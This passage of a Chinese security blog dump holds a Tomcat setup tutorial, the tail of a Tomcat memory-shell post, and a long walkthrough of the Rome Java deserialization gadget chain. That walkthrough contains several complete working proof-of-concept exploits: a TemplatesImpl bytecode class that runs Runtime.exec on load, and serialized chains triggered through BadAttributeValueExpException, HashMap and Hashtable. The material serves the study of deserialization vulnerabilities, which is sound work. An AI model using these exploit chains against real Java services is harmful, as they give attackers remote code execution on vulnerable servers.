%\u0026gt; 然后开启服务器即可：\n成功执行：\n参考文章：\nhttps://www.freebuf.com/articles/web/343094.html\n","date":"2024-09-03T20:23:06+08:00","permalink":"https://fupanc-w1n.github.io/p/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/","title":"Tomcat内存马"},{"content":"Tomcat搭建教程 先在官网下载tomcat，我这里下载的tomcat9： 然后就可以开始创建项目了。\n创建项目 创建一个新的maven项目即可，jdk版本使用的8： 创建过后就打开项目结构，打开Facets模块，点击这个+号然后选择web：\n然后会自动弹出选模块，选择自己创建的项目即可： 确定后就是如下：\n然后点击下面那个创建工件。然后就跳转到下面这个界面，再点击应用+确定即可：\n配置Tomcat服务器 点开当前文件后点击配置，再点击弹出来的+号（我这里是已经配置好了，如图点击编辑配置即可）：\n然后选择本地的tomcat：\n然后选好之前下载的tomcat路径即可：\n这里的HTTP端口可以改一下，防止与常用的burp的8080端口冲突。然后配置输出路径：\n如图先点击部署然后点击+再点击工件即可，这里的工件就是本地的文件部署（也就是后续搭建好环境后可以直接在idea写的应用程序的源码），同样的可以直接添加一个外部源（通常是一个war包）来作为一个新的应用程序，后续成功搭建的效果如下：\n然后回到server，选择热部署，这样改了文件过后刷新一下即可，根据自己需求选择浏览器：\n然后apply和确定即可。\n现在就可以尝试开始运行了，先在web目录下创建一个index.jsp文件：\n内容为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;%-- Created by IntelliJ IDEA. User: ASUS Date: 2024/8/30 Time: 13:00 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 然后点击运行即可： 如果此时idea控制台上输出有乱码，这是因为两边的编码格式不同，tomcat配置文件中是UTF-8：\n可以将这个改成idea默认的GBK\n或者改idea这里为UTF-8，即改成相同的。\n随后就没有乱码问题了，成功配置tomcat环境。\n参考文章：\nhttps://www.cnblogs.com/bktown/p/17636156.html#%E4%B8%8B%E8%BD%BDtomcat\n","date":"2024-08-30T20:23:06+08:00","permalink":"https://fupanc-w1n.github.io/p/tomcat%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/","title":"Tomcat搭建教程"},{"content":"Rome链 RMOE 是一个用于RSS 和 Atom 订阅的Java框架。它是开源的。\n它是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或Java对象。\n环境准备 环境依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;rome\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试环境：\nJDK 8u411 rome 1.0 需要了解的类 ToStringBean 这个类位于com.sun.syndication.feed.impl.ToStringBean，这个类主要就是看他的toString方法。\n他有两个toString()方法，前一个是无参的public类型的方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public String toString() { Stack stack = (Stack)PREFIX_TL.get(); String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek()); String prefix; if (tsInfo == null) { String className = this._obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } return this.toString(prefix); } 后面一个就是有参的private类型的方法，源代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } catch (Exception var8) { sb.append(\u0026#34;\\n\\nEXCEPTION: Could not complete \u0026#34; + this._obj.getClass() + \u0026#34;.toString(): \u0026#34; + var8.getMessage() + \u0026#34;\\n\u0026#34;); } return sb.toString(); } 先简单了解一下，后面再细说。\nObjectBean 这个类位于com.sun.syndication.feed.impl.ObjectBean，它是Rome 提供的一个封装类型，初始化时提供了一个 Class 类型和一个Object 对象实例进行封装： 现在着重于看这个类中的方法，这里有三个方法可以利用，下面分别说明一下：\ntoString() ObjectBean类的toString()方法源代码如下：\n所以这里会调用ToStringBean类的toString()方法，前面说过ToStringBean有两个toString()方法，这里是没有传入参数的，所以调用的是ToStringBean的第一个toString()方法。\n并且可以看出最后调用的是第二个toString并传入了prefix，这里简单分析一下图中我画红线两段代码，其实就是获取我传入的类实例的名字。看下面代码就能看懂：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package org.example; public class Haha { public static void main(String[] args) throws Exception { String prefix; Haha _obj =new Haha(); String className = _obj.getClass().getName(); System.out.println(className); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); System.out.println(prefix); } } 结果为：\n1 2 org.example.Haha Haha 基本就知道了，就是用来获取类名的。\n——————\n现在我们再来看第二个toString()方法，重点分析其中的一部分代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } 1.先看BeanIntrospector.getPropertyDescriptors(this._beanClass)，我们点开源代码看一下：\n这里用到了_introspected变量，我们可以看一下这个变量的赋值： 可以看到这里就直接将这个变量赋值为了HashMap类的实例。继续看getPropertyDescriptors方法，逐行来看：\n1 PropertyDescriptor[] descriptors = (PropertyDescriptor[])((PropertyDescriptor[])_introspected.get(klass)); 所以这里会调用HashMap的get方法，来获取kclass对应的值。\n再来看一下我们在实例化ObjectBean时调用的ToStringBean类的构造方法： 所以这里的kclass对应的_beanClass的类型是一个Class类对象。\n——————\n继续getPropertyDescriptors方法，很明显我们并没有往BeanIntrospector的HashMap中放入任何值，所以这里的get()返回的肯定是null。\n所以顺理成章进入到if语句，如下代码：\n1 2 3 4 if (descriptors == null) { descriptors = getPDs(klass); _introspected.put(klass, descriptors); } 这里会先调用getPDs()方法，然后再将这个kclass和getPDs的结果put进HasMap里形成一个键值对。\n现在再来看这里调用的getPDs()： 这个方法大概就是获取这个Class对象所有的getter和setter然后打包成数组返回。\n所以这个方法最终会将这个Class对象和它的setterr和getter打包成键值对放入BeanIntrospector类的HashMap中。\n最后会将这个数组返回：\n所以这里的getPropertyDescriptors()方法就是获取我们传入的Class对象的getter和setter方法，逻辑还是挺好看懂的，如果HashMap中有相对应的键值对就直接以数组形式返回setter和getter方法，没有的话就重新找然后返回。\n————————\n2.继续看toString()方法，现在得到了结果，假设我们传入的Class有getter和setter，那么getPropertyDescriptors()方法返回的就不为null，即pds不为null，成功进入if条件：\n1 2 3 4 5 6 7 8 9 10 if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } 现在就是重点分析if语句内的java语句了。\n对于这个for循环，只要能进入if语句就能进行至少一次for循环（因为数组中只要有一个值那么length就为1），继续看后面的代码： 然后这里的 getReadMethod() 方法是获取Class对象的getter方法，如果正确获取到了get方法，应该就可以通过里面的if条件，然后就可以调用到invoke方法，这里的NO_PARAMS变量的值也是固定的，如下： 这里可以把new Object[0]理解成类似于null这种，然后就可以正常调用getter方法获取值。\n现在就出来了一条链，类似CB链这种，现在就可以利用到TemplateImpl类的getOutputProperties()方法： 这样就可以直接构造攻击了。现在就可以先去看攻击构造的toString部分了.\nhashCode() 再粘过来一下ObjectBean的构造方法：\n这里ObjectBean类的hashCode()方法源码如下：\n然后从上面的初始化方法可以看出这里会调用 _equalsBean 变量对应的EqualsBean类实例的beanHashCode() 方法，源码如下： 这里就又是一个触发toString()方法的地方，并且这个EqualsBean类的_obj变量是可控的： 前面的判断语句就是看我传入的参数obj是否是beanClass类的实例，是的话就返回true，反之依然，由于!，所以这里我们传入的obj需要是beanClass的实例。只要我们将这里的Obj又控制为一个恶意ObjectBean类实例即可。\n现在就又可以构造一个利用链了。这里是用的HashMap来构造。现在就可以直接去看攻击构造的hashCode()那一步了。\nequals() 同样的再次把ObjectBean构造方法粘过来一下： 现在来看这个类的equals()方法： 所以这里会调用EqualsBean类的beanEquals()方法，方法重点源码如下：\n这里的代码和前面的toString()方法大相径庭，还是获取一个类的getter和setter方法，然后调用invoke()方法。\n现在的想法就是对前面的if条件的判断，如下： 前面很好进，主要就是我重点标注的地方。这里就是要求我们传入的obj是 _beanClass 的实例。这个简单，传一个impl进去就行。\n先来看我们如何调用这个equals()方法。正好我们的CC7中就有利用到equals()方法。这里就是用Hashtable类。\n后续就可以直接去看攻击构造了。\n攻击构造 toString() 前面说的已经非常清楚了。还是挺简单的。\n那么还是利用动态加载字节码。基本盘： Test.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是接入链子。\n主要就是想在哪里可以调用ObjectBean的toString()方法。而在CC5中用到的BadAttributeValueExpException类反序时就可以调用到toStirng方法（这个类位于javax.management.BadAttributeValueExpException）：\n在CC5我们就说了这里的valObj其实对应的就是序列化的变量val，所以我们控制这个变量为ObjectBean()即可，使用反射来更改val的值即可，那么构造的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(TemplatesImpl.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 弹不了，然后我去看了一下其他师傅的文章，发现这里不能用TemplatesImpl.class，而是Templates.class，关系如下： 在Templates.class中有个接口，里面就有我们要利用的getOutputProperties：\n所以我们就可以使用Templates.class来获取到这个getter方法。\n那么为什么我们要使用这个呢？明明逻辑上没有问题，TemplatesImpl.class就是有问题呢？\n先给POC，然后我们再调试看看。\n所以最终POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(Templates.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在来解决一下之前的问题。我打断点如下：\n确实成功直接获取到了我们想要利用的getOutputProperties()方法，但是当我如下打断点：\n然后调试，发现这里并不会进入到这个语句。这让我想到了之前CC5个人思考那里的问题，在我们动态加载字节码的时候，由于其中的过程，导致了在中间某一步直接报错退出。\n结合这个，我们来想一下如果利用TemplatesImpl.class，因为TemplatesImpl.class中的getter不止一个，所以其实很有可能在其中某个getter直接报错退出了，导致我们没能成功利用到想用的getOutputProperties()方法。\n然后我们再用原先错误的TemplatesImpl.class调试一下，还是打断点如下： 当调用到getStylesheetDOM()时，invoke那里确实就直接报错退出到catch部分了： 这个getStylesheetDOM()方法如下： ——————\nOK，问题解决。\n所以注意：后面这里记到用Templates.class，而不是TemplatesImpl.class。\nhashCode() 这里是用的HashMap，但是同样的应该HashSet和Hashtable也行，这三个都是有hashCode链的。分析一下HashMap类： 同样的基本盘：\nTest.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是接入HashMap。\n还是很简单的。\n就是为了触发恶意ObjectBean的toString()方法，POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); HashMap hashMap = new HashMap(); ObjectBean x = new ObjectBean(ObjectBean.class,bean); hashMap.put(x,\u0026#34;fupanc\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功按照预期弹出两个计算机。（序列一个，反序列化一个）\n但是好像还是有点问题，构思一下，如何在反序列化的时候只弹出一个计算机：\n正常来说肯定会在序列化前的那个put()方法会调用一次完整的链，那里会导致异常输出，所以并不能成功利用。\n现在来看看在toString()方法获取getter并调用的代码：\n我想到了一个点，是否可以让这里的pds为null，从而在序列化前不进入if条件从而不会调用到getter方法，在put方法过后再反射修改值呢？\n那么这个pds变量的赋值也是分析过的，所以可以尝试找没有getter和setter方法的class对象？\n主要是要满足如下条件：\n也就是这个EqualsBean类实例化时必须满足相对应的实例。找了一下没找到。\n其实具体的方法可以参考后面的equals()方法链的解决方法，具体想法可以先看后面，这里就给一个POC后再简单说明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean bean = new ToStringBean(Templates.class,impl); EqualsBean x = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(x,\u0026#34;fupanc\u0026#34;); setFieldValue(x,\u0026#34;_beanClass\u0026#34;,ToStringBean.class); setFieldValue(x,\u0026#34;_obj\u0026#34;,bean); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 简单说明一下，这里将ObjectBean类都换成了相对应的类，并且其实这里最终调用的都是相对应的类：\n对于这里的hashCode()，其实调用的就是EqualsBean类的beanHashCode()方法：\n也就是漏洞触发点：\n在这里，我是将EqualsBean赋值时也是相对应的String.class和\u0026quot;fupanc\u0026quot;，符合EqualsBean类的构造函数方法，主要的不同点就是上面的beanHashCode()方法，原先的POC中是会直接调用到toString()方法触发一次调用链的，但是在这里，我将这个_obj变量赋值为了一个字符串实例，所以这里就是一个单纯的算hash的过程：\n那么后续就是成功往hashMap中放进了键值对，然后在反序列化时也是符合预期的：\n并且运行后只在反序列化时弹出一个计算机，成功修改。\n等如HashSet、Hashtable基本都差不多，如果过滤HashMap时要想到这些。\nequals() 还是先来给出基本盘： Test.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在还是来想如何将基本盘接入Hashtable类。\n重点还是在于readObject()调用的reconstitutionPut()： 下面来分析一下。\n先从序列化过程说起。再总结一下前面的需求： 1.首先就是调用到的ObjectBean的equals()方法，现在着重看参数： 这里传入的other参数，继续看beanEquals()方法： 也就是这里的obj，单纯对obj来说就这前面的利用，由于我们想要正常利用后面的invoke()方法，所以需要满足this._beanClass.isInstance(obj)，这样才会进入else执行我们想用的代码。在这里我会尝试传入一个TemplatesImpl实例，但是真正利用的却并不是这个传入的TemplatesImpl类实例，看利用代码：\n也是之前一直说的，动态加载字节码后会直接报异常然后退出，所以这里真正利用到的其实只是这个bean1，而这个bean1对应的是_obj这个变量，那个这里的bean1，也就是我们构造的参数传递的值，起的真正作用是什么，就是为了满足this._beanClass.isInstance(obj)，也就只有这个作用了，具体参数传递后面会讲，作用也就是这个。\n2.现在再来看一下Hashtable的put方法：\n如何触发equals()方法，自己想了一下，本来想直接传入ObjectBean类实例的，但是对于这里的hash相等不一定。\n看了一下nivia师傅的文章，调用的是HashMap的equals()方法，这个equals()方法调用过程是和CC7的那条链差不多的。\n现在再来看一下HashMap的equals()调用过程：\nHashMap父类AbstractMap的equals()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } 在这个方法代码里面还有一处是调用的equals\n就是这里，只要控制这里的value为ObjectBean类实例即可。\n结合前面的需求，我们需要传入两个，一个是HashMap类实例，还有个就是TemplatesImpl类实例，但是看这里参数的传递，其实就是m.get(key)得到的值就是对应前面说过的ObjectBean类的equals()方法的other，然后这里的m又是对应的传入的o：\n即： 这里的key。\n所以现在我们是需要传入两个HashMap类实例，然后这里对第二个HashMap类调用get时可以返回一个TemplatesImpl类实例。所以我们需要put进去。\n这里总结一下前面的需求：\nvalue赋值为ObjectBean类实例\n传入两个HashMap类实例并且需要有TemplatesImpl类实例的值。\n问题解决：\nvalue的赋值问题： 就是这个，所以我们还需要给HashMap传进去一个ObjectBean类实例的值。同时在CC7学习中，我们可以知道这里的e是hashMap0（假设会向Hashtable中传入hashMap0和hashMap1），这也是为什么在CC7那里要移除yy的原因。\n根据这个，我们的两个HashMap类就需要有逻辑。直接给代码：\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); 比如说当前面拿到的第一个HashMap的key和value分别为zZ和bean，那么此时对于我们的第二个HashMap调用的就是get(\u0026ldquo;zZ\u0026rdquo;)，而我们这里需要的是impl，所以在第二个HashMap的键值对中我们就需要将键zZ的值设置为impl，所以这里也是需要反着来的原因。\n那么又是为什么要两个呢？\n按理说应该如下代码就行了：\n1 2 3 4 5 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); 